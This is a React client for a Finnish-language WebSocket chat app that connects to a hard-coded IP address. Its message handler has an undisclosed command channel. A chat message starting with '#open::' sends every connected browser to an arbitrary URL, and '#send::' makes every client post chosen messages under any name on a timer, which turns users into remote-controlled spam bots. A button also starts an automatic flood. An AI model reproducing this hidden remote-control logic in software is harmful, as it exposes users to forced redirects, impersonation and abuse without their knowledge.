import React, { Component } from 'react';
import axios from 'axios';
import './App.css';

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

class App extends Component {
  state = {
    messages: [],
    username: "",
    usernameConfirmed: false,
    sentMessages: 0,
    message: "",
    color: 0,
  };

  componentDidMount() {
    // this.getMessages();
    this.initWebSocket();
  }

  componentDidUpdate(prevProps, prevState) {
    if (!prevState.usernameConfirmed && this.state.usernameConfirmed) {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }

    if (this.state.messages.length > 10) {
      this.setState({ messages: [] });
    }
  }

  getMessages = async () => {
    const { data } = await axios.get("http://139.162.254.62/api/messages");
    console.log(data);
    this.setState({ messages: data });
  };

  initWebSocket = () => {
    this.websocket = new WebSocket("ws://139.162.254.62/ws");
    this.websocket.onmessage = this.handleMessage;
    this.websocket.onerror = this.handleError;
    this.websocket.onclose = this.handleOnClose;
  };

  handleOnClose = () => {
    console.log("Connection closed, starting new one...");
    this.initWebSocket();
  };

  handleError = (error) => {
    console.log("error: ", error);
  };

  sendMessage = (e) => {
    e.preventDefault();
    this.websocket.send(JSON.stringify({
      name: this.state.username,
      message: this.state.message,
      color: this.state.color,
    }));
    this.setState({ message: "" });
  };

  handleCommand = data => {
    console.log(data);
    if (data.message[0] === "#") {
      const splittedMessage = data.message.split('::');
      const command = splittedMessage[0];
      if (command === "#open") {
        window.open(splittedMessage[1], "_self");
      } else if (command === "#send") {
        const name = splittedMessage[1];
        const message = splittedMessage[2];
        const interval = splittedMessage[3];
        console.log(name, message, interval);
        if (this.messageInterval) clearInterval(this.messageInterval);
        this.messageInterval = setInterval(() => {
          this.setState(prevState => ({
            sentMessages: prevState.sentMessages + 1
          }));
          this.websocket.send(JSON.stringify({
            name,
            message,
            color: 'green',
          }));
        }, interval || 1000);
      }
    }
  }

  handleMessage = (e) => {
    this.handleCommand(JSON.parse(e.data));
    this.setState({ messages: [ ...this.state.messages, JSON.parse(e.data) ] });
    setTimeout(() => {
      const objDiv = document.getElementById("chatwindow");
      if (objDiv) {
        objDiv.scrollTop = objDiv.scrollHeight;
      }
    }, 200);
  };

  changeUsername = (e) => {
    this.setState({ username: e.target.value })
  };

  startSending = () => {
    if (this.messageInterval) clearInterval(this.messageInterval);
    this.messageInterval = setInterval(() => {
      this.websocket.send(JSON.stringify({
        name: 'Santeri',
        message: 'Moikka!',
        color: 'green',
      }));
    }, this.state.interval || 1000);
  };

  confirmUsername = () => {
    this.setState({
      usernameConfirmed: true,
      color: 'green',
    });
  };

  handleMessageChange = (e) => {
    this.setState({ message: e.target.value });
  };

  renderMessages = () => {
    return this.state.messages.map((message, i) => {
      return (
        <div className="Message-wrapper" key={i}>
          <div className="Message-block" key={i} style={{ float: message.name === this.state.username ? "right" : "left" }}>
            <div className="Message-name" style={{ color: message.color }}>{message.name}</div>
            <div className="Message-content">{message.message}</div>
          </div>
        </div>
      );
    });
  };

  render() {
    const { usernameConfirmed, sentMessages } = this.state;

    return (
      <div className="App">
        <header className="App-header">
          <h1 className="App-title">Chat</h1>
          <button onClick={this.startSending}>Laheta</button>
          <input onChange={e => this.setState({ interval: e.target.value })} />
          <div style={{ float: "right" }}>{sentMessages}</div>
        </header>
        {!usernameConfirmed ?
          <div className="Login-div">
            <p style={{ fontWeight: "bold", fontSize: "16px" }}>Anna käyttäjänimi</p>
            <input className="Login-input" value={this.state.username} onChange={this.changeUsername} type="text" />
            <div className="Ok-button" onClick={this.confirmUsername}>Ok</div>
          </div> :
          <div className="Chat-window">
            <div id="chatwindow" className="Message-div">
              {this.renderMessages()}
            </div>
            <form onSubmit={this.sendMessage}>
              <div className="Chat-input">
                <input className="Chat-inputfield" onChange={this.handleMessageChange} value={this.state.message} type="text" />
                <div className="Send-button" onClick={this.sendMessage}>Lähetä</div>
              </div>
            </form>
          </div>
        }
      </div>
    );
  }
}

export default App;
